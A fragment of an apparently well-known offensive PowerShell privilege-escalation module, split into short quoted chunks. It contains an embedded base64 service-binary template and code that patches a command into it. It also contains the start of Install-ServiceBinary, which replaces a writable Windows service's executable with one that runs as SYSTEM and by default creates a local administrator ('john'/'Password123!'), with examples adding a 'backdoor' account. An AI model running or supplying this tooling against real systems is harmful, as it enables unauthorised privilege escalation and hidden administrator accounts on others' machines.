IAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAIA','AgACAAIAAgAC','AAIAAgACAAAA','9jAG0AZAAuAG','UAeABlAABwlQ','EkfW6TS5S/gw','mLKZ5MAAiwP1','9/EdUKOgi3el','xWGTTgiQMGEg','0EIAEBAgMgAA','EFIAEBHQ4DAA','ABBCABAQ4FIA','EBEUkEIAEBCA','MgAA4GAAISYQ','4OBAABAQgDBw','EOBgABAR0SBQ','gHAh0SBR0SBQ','wBAAdVcGRhdG','VyAAAFAQAAAA','AXAQASQ29weX','JpZ2h0IMKpIC','AyMDE1AAApAQ','AkN2NhMWIzMm','EtOWMzNy00MT','ViLWJkOWYtZG','RmNDE5OWUxNm','VjAAAMAQAHMS','4wLjAuMAAAZQ','EAKS5ORVRGcm','FtZXdvcmssVm','Vyc2lvbj12NC','4wLFByb2ZpbG','U9Q2xpZW50AQ','BUDhRGcmFtZX','dvcmtEaXNwbG','F5TmFtZR8uTk','VUIEZyYW1ld2','9yayA0IENsaW','VudCBQcm9maW','xlCAEAAgAAAA','AACAEACAAAAA','AAHgEAAQBUAh','ZXcmFwTm9uRX','hjZXB0aW9uVG','hyb3dzAQAAAA','AA0zU/VQAAAA','ACAAAAWgAAAG','xpAABsSwAAUl','NEU96HoAZJqg','NGhaplF41X24','IDAAAAQzpcVX','NlcnNcbGFiXE','Rlc2t0b3BcVX','BkYXRlcjJcVX','BkYXRlclxvYm','pceDg2XFJlbG','Vhc2VcVXBkYX','Rlci5wZGIAAA','DwaQAAAAAAAA','AAAAAOagAAAC','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAGoAAA','AAAAAAAAAAAA','AAAAAAX0Nvck','V4ZU1haW4AbX','Njb3JlZS5kbG','wAAAAAAP8lAC','BAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAACAB','AAAAAgAACAGA','AAADgAAIAAAA','AAAAAAAAAAAA','AAAAEAAQAAAF','AAAIAAAAAAAA','AAAAAAAAAAAA','EAAQAAAGgAAI','AAAAAAAAAAAA','AAAAAAAAEAAA','AAAIAAAAAAAA','AAAAAAAAAAAA','AAAAEAAAAAAJ','AAAACggAAAoA','IAAAAAAAAAAA','AAQIMAAOoBAA','AAAAAAAAAAAK','ACNAAAAFYAUw','BfAFYARQBSAF','MASQBPAE4AXw','BJAE4ARgBPAA','AAAAC9BO/+AA','ABAAAAAQAAAA','AAAAABAAAAAA','A/AAAAAAAAAA','QAAAABAAAAAA','AAAAAAAAAAAA','AARAAAAAEAVg','BhAHIARgBpAG','wAZQBJAG4AZg','BvAAAAAAAkAA','QAAABUAHIAYQ','BuAHMAbABhAH','QAaQBvAG4AAA','AAAAAAsAQAAg','AAAQBTAHQAcg','BpAG4AZwBGAG','kAbABlAEkAbg','BmAG8AAADcAQ','AAAQAwADAAMA','AwADAANABiAD','AAAAA4AAgAAQ','BGAGkAbABlAE','QAZQBzAGMAcg','BpAHAAdABpAG','8AbgAAAAAAVQ','BwAGQAYQB0AG','UAcgAAADAACA','ABAEYAaQBsAG','UAVgBlAHIAcw','BpAG8AbgAAAA','AAMQAuADAALg','AwAC4AMAAAAD','gADAABAEkAbg','B0AGUAcgBuAG','EAbABOAGEAbQ','BlAAAAVQBwAG','QAYQB0AGUAcg','AuAGUAeABlAA','AASAASAAEATA','BlAGcAYQBsAE','MAbwBwAHkAcg','BpAGcAaAB0AA','AAQwBvAHAAeQ','ByAGkAZwBoAH','QAIACpACAAIA','AyADAAMQA1AA','AAQAAMAAEATw','ByAGkAZwBpAG','4AYQBsAEYAaQ','BsAGUAbgBhAG','0AZQAAAFUAcA','BkAGEAdABlAH','IALgBlAHgAZQ','AAADAACAABAF','AAcgBvAGQAdQ','BjAHQATgBhAG','0AZQAAAAAAVQ','BwAGQAYQB0AG','UAcgAAADQACA','ABAFAAcgBvAG','QAdQBjAHQAVg','BlAHIAcwBpAG','8AbgAAADEALg','AwAC4AMAAuAD','AAAAA4AAgAAQ','BBAHMAcwBlAG','0AYgBsAHkAIA','BWAGUAcgBzAG','kAbwBuAAAAMQ','AuADAALgAwAC','4AMAAAAO+7vz','w/eG1sIHZlcn','Npb249IjEuMC','IgZW5jb2Rpbm','c9IlVURi04Ii','BzdGFuZGFsb2','5lPSJ5ZXMiPz','4NCjxhc3NlbW','JseSB4bWxucz','0idXJuOnNjaG','VtYXMtbWljcm','9zb2Z0LWNvbT','phc20udjEiIG','1hbmlmZXN0Vm','Vyc2lvbj0iMS','4wIj4NCiAgPG','Fzc2VtYmx5SW','RlbnRpdHkgdm','Vyc2lvbj0iMS','4wLjAuMCIgbm','FtZT0iTXlBcH','BsaWNhdGlvbi','5hcHAiLz4NCi','AgPHRydXN0SW','5mbyB4bWxucz','0idXJuOnNjaG','VtYXMtbWljcm','9zb2Z0LWNvbT','phc20udjIiPg','0KICAgIDxzZW','N1cml0eT4NCi','AgICAgIDxyZX','F1ZXN0ZWRQcm','l2aWxlZ2VzIH','htbG5zPSJ1cm','46c2NoZW1hcy','1taWNyb3NvZn','QtY29tOmFzbS','52MyI+DQogIC','AgICAgIDxyZX','F1ZXN0ZWRFeG','VjdXRpb25MZX','ZlbCBsZXZlbD','0iYXNJbnZva2','VyIiB1aUFjY2','Vzcz0iZmFsc2','UiLz4NCiAgIC','AgIDwvcmVxdW','VzdGVkUHJpdm','lsZWdlcz4NCi','AgICA8L3NlY3','VyaXR5Pg0KIC','A8L3RydXN0SW','5mbz4NCjwvYX','NzZW1ibHk+DQ','oAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAG','AAAAwAAAAgOg','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAA="
','        [Byt','e[]] $Binary',' = [Byte[]][','Convert]::Fr','omBase64Stri','ng($B64Binar','y)

        ','if ($PSBound','Parameters[''','Command'']) {','
           ',' $ServiceCom','mand = $Comm','and
        ','}
        el','se {
       ','     if ($PS','BoundParamet','ers[''Credent','ial'']) {
   ','            ',' $UserNameTo','Add = $Crede','ntial.UserNa','me
         ','       $Pass','wordToAdd = ','$Credential.','GetNetworkCr','edential().P','assword
    ','        }
  ','          el','se {
       ','         $Us','erNameToAdd ','= $UserName
','            ','    $Passwor','dToAdd = $Pa','ssword
     ','       }

  ','          if',' ($UserNameT','oAdd.Contain','s(''\'')) {
  ','            ','  # only add','ing a domain',' user to the',' local group',', no user cr','eation
     ','           $','ServiceComma','nd = "net lo','calgroup $Lo','calGroup $Us','erNameToAdd ','/add"
      ','      }
    ','        else',' {
         ','       # cre','ate a local ','user and add',' it to the l','ocal specifi','ed group
   ','            ',' $ServiceCom','mand = "net ','user $UserNa','meToAdd $Pas','swordToAdd /','add && timeo','ut /t 5 && n','et localgrou','p $LocalGrou','p $UserNameT','oAdd /add"
 ','           }','
        }
 ','   }

    PR','OCESS {

   ','     $Target','Service = Ge','t-Service -N','ame $Name

 ','       # get',' the unicode',' byte conver','sions of all',' arguments
 ','       $Enc ','= [System.Te','xt.Encoding]','::Unicode
  ','      $Servi','ceNameBytes ','= $Enc.GetBy','tes($TargetS','ervice.Name)','
        $Co','mmandBytes =',' $Enc.GetByt','es($ServiceC','ommand)

   ','     # patch',' all values ','in to their ','appropriate ','locations
  ','      for ($','i=0; $i -lt ','($ServiceNam','eBytes.Lengt','h); $i++) {
','            ','# service na','me offset = ','2458
       ','     $Binary','[$i+2458] = ','$ServiceName','Bytes[$i]
  ','      }
    ','    for ($i=','0; $i -lt ($','CommandBytes','.Length); $i','++) {
      ','      # cmd ','offset = 253','5
          ','  $Binary[$i','+2535] = $Co','mmandBytes[$','i]
        }','

        Se','t-Content -V','alue $Binary',' -Encoding B','yte -Path $P','ath -Force -','ErrorAction ','Stop

      ','  $Out = New','-Object PSOb','ject
       ',' $Out | Add-','Member Notep','roperty ''Ser','viceName'' $T','argetService','.Name
      ','  $Out | Add','-Member Note','property ''Pa','th'' $Path
  ','      $Out |',' Add-Member ','Noteproperty',' ''Command'' $','ServiceComma','nd
        $','Out.PSObject','.TypeNames.I','nsert(0, ''Po','werUp.Servic','eBinary'')
  ','      $Out
 ','   }
}


fun','ction Instal','l-ServiceBin','ary {
<#
.SY','NOPSIS

Repl','aces the ser','vice binary ','for the spec','ified servic','e with one t','hat executes','
a specified',' command as ','SYSTEM.

Aut','hor: Will Sc','hroeder (@ha','rmj0y)  
Lic','ense: BSD 3-','Clause  
Req','uired Depend','encies: Get-','ServiceDetai','l, Get-Modif','iablePath, W','rite-Service','Binary  

.D','ESCRIPTION

','Takes a serv','ice Name or ','a ServicePro','cess.Service','Controller o','n the pipeli','ne where the','
current use','r can  modif','y the associ','ated service',' binary list','ed in the bi','nPath. Backs',' up
the orig','inal service',' binary to "','OriginalServ','ice.exe.bak"',' in service ','binary locat','ion,
and the','n uses Write','-ServiceBina','ry to create',' a C# servic','e binary tha','t either add','s
a local ad','ministrator ','user or exec','utes a custo','m command. T','he new servi','ce binary is','
replaced in',' the origina','l service bi','nary path, a','nd a custom ','object is re','turned that
','captures the',' original an','d new servic','e binary con','figuration.
','
.PARAMETER ','Name

The se','rvice name t','he EXE will ','be running u','nder.

.PARA','METER UserNa','me

The [dom','ain\]usernam','e to add. If',' not given, ','it defaults ','to "john".
D','omain users ','are not crea','ted, only ad','ded to the s','pecified loc','algroup.

.P','ARAMETER Pas','sword

The p','assword to s','et for the a','dded user. I','f not given,',' it defaults',' to "Passwor','d123!"

.PAR','AMETER Local','Group

Local',' group name ','to add the u','ser to (defa','ult of ''Admi','nistrators'')','.

.PARAMETE','R Credential','

A [Managem','ent.Automati','on.PSCredent','ial] object ','specifying t','he user/pass','word to add.','

.PARAMETER',' Command

Cu','stom command',' to execute ','instead of u','ser creation','.

.EXAMPLE
','
Install-Ser','viceBinary -','Name VulnSVC','

Backs up t','he original ','service bina','ry to SERVIC','E_PATH.exe.b','ak and repla','ces the bina','ry
for VulnS','VC with one ','that adds a ','local Admini','strator (joh','n/Password12','3!).

.EXAMP','LE

Get-Serv','ice VulnSVC ','| Install-Se','rviceBinary
','
Backs up th','e original s','ervice binar','y to SERVICE','_PATH.exe.ba','k and replac','es the binar','y
for VulnSV','C with one t','hat adds a l','ocal Adminis','trator (john','/Password123','!).

.EXAMPL','E

Install-S','erviceBinary',' -Name VulnS','VC -UserName',' ''TESTLAB\jo','hn''

Backs u','p the origin','al service b','inary to SER','VICE_PATH.ex','e.bak and re','places the b','inary
for Vu','lnSVC with o','ne that adds',' TESTLAB\joh','n to the Adm','inistrators ','local group.','

.EXAMPLE

','Install-Serv','iceBinary -N','ame VulnSVC ','-UserName ba','ckdoor -Pass','word Passwor','d123!

Backs',' up the orig','inal service',' binary to S','ERVICE_PATH.','exe.bak and ','replaces the',' binary
for ','VulnSVC with',' one that ad','ds a local A','dministrator',' (backdoor/P','assword123!)','.

.EXAMPLE
','
Install-Ser','viceBinary -','Name VulnSVC',' -Command "n','et ..."

Bac','ks up the or','iginal servi','ce binary to',' SERVICE_PAT','H.exe.bak an','d replaces t','he binary
fo','r VulnSVC wi','th one that ','executes a c','ustom comman','d.

.OUTPUTS','

PowerUp.Se','rviceBinary.','Installed
#>','

    [Diagn','ostics.CodeA','nalysis.Supp','ressMessageA','ttribute(''PS','ShouldProces','s'', '''')]
   ',' [Diagnostic','s.CodeAnalys','is.SuppressM','essageAttrib','ute(''PSAvoid','UsingUserNam','eAndPassWord','Params'', '''')',']
    [Diagn','ostics.CodeA','nalysis.Supp','ressMessageA','ttribute(''PS','AvoidUsingPl','ainTextForPa','ssword'', '''')',']
    [Outpu','tType(''Power','Up.ServiceBi','nary.Install','ed'')]
    [C','mdletBinding','()]
    Para','m(
        [','Parameter(Po','sition = 0, ','Mandatory = ','$True, Value','FromPipeline',' = $True, Va','lueFromPipel','ineByPropert','yName = $Tru','e)]
        ','[Alias(''Serv','iceName'')]
 ','       [Stri','ng]
        ','[ValidateNot','NullOrEmpty(',')]
        $','Name,

     ','   [String]
','        $Use','rName = ''joh','n'',

       ',' [String]
  ','      $Passw','ord = ''Passw','ord123!'',

 ','       [Stri','ng]
        ','$LocalGroup ','= ''Administr','ators'',

   ','     [Manage','ment.Automat','ion.PSCreden','tial]
      ','  [Managemen','t.Automation','.CredentialA','ttribute()]
','        $Cre','dential = [M','anagement.Au','tomation.PSC','redential]::','Empty,

    ','    [String]','
        [Va','lidateNotNul','lOrEmpty()]
','        $Com','mand
    )

','    BEGIN {
','        if (','$PSBoundPara','meters[''Comm','and'']) {
   ','         $Se','rviceCommand',' = $Command
','        }
  ','      else {','
           ',' if ($PSBoun','dParameters[','''Credential''',']) {
       ','         $Us','erNameToAdd ','= $Credentia','l.UserName
